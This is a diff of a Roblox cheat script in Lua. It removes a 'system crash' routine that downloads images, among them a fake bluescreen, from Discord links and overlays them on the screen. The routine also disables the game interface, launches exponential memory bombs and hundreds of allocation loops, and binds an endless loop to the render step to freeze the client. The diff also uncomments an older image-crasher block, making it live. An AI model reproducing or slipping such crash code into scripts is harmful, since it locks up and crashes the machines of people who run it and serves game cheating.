@@ -399,7 +399,7 @@ local function updateAntiAim()
     end)
 end
 
---[[IMAGE CRASHER LOGIC
+-- IMAGE CRASHER LOGIC
 local function getImageId(url)
     local success, response = pcall(function()
         return request({ Url = url, Method = "GET" })
@@ -455,103 +455,6 @@ local function triggerImageCrash()
     game:GetService("ScriptContext"):SetTimeout(9999999999)
     RunService.RenderStepped:Connect(function()
         task.spawn(function() while true do end end)
-    end)
-end]]--
-
--- SYSTEM CRASH LOGIC (Kernel-Level Overload)
-local function getImageId(url)
-    local success, response = pcall(function()
-        return request({ Url = url, Method = "GET" })
-    end)
-    if not success or not response.Success then return "" end
-    
-    local pngName = math.random(1, 100000) .. ".png"
-    writefile(pngName, response.Body)
-    if not isfile(pngName) then return "" end
-    
-    local assetId = getcustomasset(pngName)
-    delfile(pngName)
-    return assetId or ""
-end
-
-local crashImages = {
-    "https://preview.redd.it/i-asked-an-ai-what-would-ksi-look-like-if-he-had-a-very-big-v0-f9p6hu5r52ja1.png?width=1024&format=png&auto=webp&s=a0928c942e12a35e2ba416d647134f611bf3b6ff",
-    "https://cdn.discordapp.com/attachments/1538962732152524821/1548700564672479262/image.png?ex=6aa8034c&is=6aa6b1cc&hm=f64960b6679a3fb1fc740886dc7e64b6e8ac79fd17552a8450953e769f7c632b&",
-    "https://www.drwindows.de/news/wp-content/uploads/2023/08/bluescreen_unsupported_processor.jpg",
-    "https://cdn.discordapp.com/attachments/1544282663521878066/1548705137814536252/LXNjcmVlbi5wbmc.png?ex=6aa8078e&is=6aa6b60e&hm=447fc5185b8c6168221d9628a6279ec84df0284a9f7e7e2b897a40432443a181&"
-}
-
-local function triggerImageCrash()
-    local selectedUrl = crashImages[math.random(#crashImages)]
-    local imgId = getImageId(selectedUrl)
-    
-    if not tostring(imgId):find("rbxasset") then return end
-    
-    -- Phase 1: Render Pipeline Saturation
-    for i = 1, 20 do
-        local gui = Instance.new("ScreenGui")
-        gui.IgnoreGuiInset = true
-        gui.ResetOnSpawn = false
-        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-        gui.Parent = gethui()
-        
-        local label = Instance.new("ImageLabel")
-        label.Parent = gui
-        label.Size = UDim2.new(1, 0, 1, 0)
-        label.Position = UDim2.new(0, 0, 0, 0)
-        label.Visible = true
-        label.Transparency = 0
-        label.Image = imgId
-        label.ZIndex = 100 + i
-        
-        -- Force texture upload to GPU
-        pcall(function() label.IsLoaded = true end)
-    end
-    
-    -- Phase 2: Input & UI Lockout
-    pcall(function() 
-        local robloxGui = CoreGui:FindFirstChild('RobloxGui')
-        if robloxGui then robloxGui.Enabled = false end
-    end)
-    
-    game:GetService("ScriptContext"):SetTimeout(9999999999)
-    
-    -- Phase 3: Recursive Memory Bomb (Exponential Growth)
-    local function memBomb(depth)
-        if depth > 10 then return end
-        local t = {}
-        for i = 1, 10000 do 
-            t[i] = string.rep(string.char(math.random(32,126)), 1000) 
-        end
-        -- Spawn nested bombs to create exponential memory pressure
-        task.spawn(function() memBomb(depth + 1) end)
-        task.spawn(function() memBomb(depth + 1) end)
-        return t
-    end
-    
-    -- Phase 4: Thread Scheduler Saturation
-    for i = 1, 200 do
-        task.spawn(function()
-            while true do 
-                RunService.RenderStepped:Wait()
-                RunService.Heartbeat:Wait()
-                -- Allocate garbage every frame to prevent GC from catching up
-                local _ = string.rep("A", 50000)
-            end
-        end)
-        
-        -- Start memory bombs in parallel threads
-        task.spawn(function() memBomb(0) end)
-    end
-    
-    -- Phase 5: Nuclear Render Bind
-    -- This binds an infinite loop to the absolute last render priority
-    -- It executes AFTER all graphics have been processed, starving the OS of display updates
-    RunService:BindToRenderStep("SysCrash", Enum.RenderPriority.Last.Value, function()
-        while true do 
-            -- Prevent any yield or escape
-            local _ = math.sqrt(math.random())
-        end
     end)
 end
 
